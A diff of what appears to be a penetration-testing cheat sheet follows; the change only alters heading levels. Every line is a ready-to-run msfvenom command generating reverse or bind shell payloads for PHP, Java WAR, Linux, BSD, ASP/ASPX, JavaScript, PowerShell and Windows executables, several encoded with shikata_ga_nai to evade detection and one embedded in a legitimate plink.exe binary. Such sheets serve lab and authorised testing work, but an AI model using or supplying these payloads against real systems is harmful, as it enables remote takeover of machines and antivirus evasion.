@@ -1,44 +1,44 @@
-# PHP reverse shell 
+### PHP reverse shell 
 msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR IP LPORT=PORT -f raw -o shell.php
 
-# Java WAR reverse shell 
+### Java WAR reverse shell 
 msfvenom -p java/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -f war -o shell.war
 
-# Linux bind shell 
+### Linux bind shell 
 msfvenom -p linux/x86/shell_bind_tcp LPORT=PORT -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
 
-# Linux FreeBSD reverse shell 
+### Linux FreeBSD reverse shell 
 msfvenom -p bsd/x64/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -f elf -o shell.elf
 
-# Linux C reverse shell 
+### Linux C reverse shell 
 msfvenom  -p linux/x86/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -e x86/shikata_ga_nai -f c
 
-# Windows non staged reverse shell 
+### Windows non staged reverse shell 
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -e x86/shikata_ga_nai -f exe -o non_staged.exe
 
-# Windows Staged (Meterpreter) reverse shell 
+### Windows Staged (Meterpreter) reverse shell 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR IP LPORT=PORT -e x86/shikata_ga_nai -f exe -o meterpreter.exe
 
-# Windows Python reverse shell 
+### Windows Python reverse shell 
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT EXITFUNC=thread -f python -o shell.py
 
-# Windows ASP reverse shell 
+### Windows ASP reverse shell 
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -f asp -e x86/shikata_ga_nai -o shell.asp
 
-# Windows ASPX reverse shell
+### Windows ASPX reverse shell
 msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -e x86/shikata_ga_nai -o shell.aspx
 
-# Windows JavaScript reverse shell with nops 
+### Windows JavaScript reverse shell with nops 
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -f js_le -e generic/none -n 18
 
-# Windows Powershell reverse shell 
+### Windows Powershell reverse shell 
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
 
-# Windows reverse shell excluding bad characters 
+### Windows reverse shell excluding bad characters 
 msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=YOUR IP LPORT=PORT EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
 
-# Windows x64 bit reverse shell 
+### Windows x64 bit reverse shell 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -f exe -o shell.exe
 
-# Windows reverse shell embedded into plink 
+### Windows reverse shell embedded into plink 
 msfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=PORT -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe 
